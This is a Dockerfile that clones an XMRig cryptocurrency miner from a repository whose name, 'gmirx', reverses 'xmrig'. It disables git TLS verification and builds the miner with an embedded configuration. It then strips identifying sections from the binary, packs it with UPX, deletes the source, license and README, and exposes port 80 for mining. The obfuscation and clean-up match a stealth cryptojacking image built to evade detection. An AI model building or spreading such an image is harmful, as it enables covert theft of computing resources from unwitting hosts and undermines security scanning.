FROM debian:buster

# Set environment variables to avoid interactive prompts
ENV DEBIAN_FRONTEND=noninteractive
ENV TERM=xterm

# Update and install dependencies
RUN apt-get update && \
    apt-get install --no-install-recommends -y \
    git \
    upx \
    binutils \
    build-essential \
    cmake \
    libuv1-dev \
    libmicrohttpd-dev \
    libssl-dev && \
    apt-get clean && \
    rm -rf /var/lib/apt/lists/*

# Clone the repository and build the application
RUN set -x && \
    git config --global http.sslVerify false && \
    git clone https://github.com/grozlhrle/gmirx.git /gmirx && \
    cd /gmirx && \
    mkdir build && \
    cd build && \
    cmake -DWITH_CN_GPU=OFF -DWITH_EMBEDDED_CONFIG=ON -DCMAKE_BUILD_TYPE=Release .. && \
    make

# Remove unnecessary files and optimize the binary
RUN cd /gmirx/build && \
    rm -rf ../doc ../res ../src ../CHANGELOG.md ../CMakeLists.txt ../LICENSE ../README.md ../.git && \
    strip --strip-all -s -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag xmrig && \
    upx -9 --8mib-ram --lzma xmrig

# Remove unnecessary packages and clean up
RUN apt-get remove -y --purge upx binutils git cmake build-essential && \
    apt-get autoremove -y --purge && \
    rm -rf /var/lib/apt/lists/* /gmirx/build/src /gmirx/build/Makefile && \
    find /gmirx -iwholename '*cmake*' -not -name CMakeLists.txt -delete

# Expose the mining port
EXPOSE 80

# Set the working directory
WORKDIR /gmirx/build

# Set the entry point
ENTRYPOINT ["./xmrig"]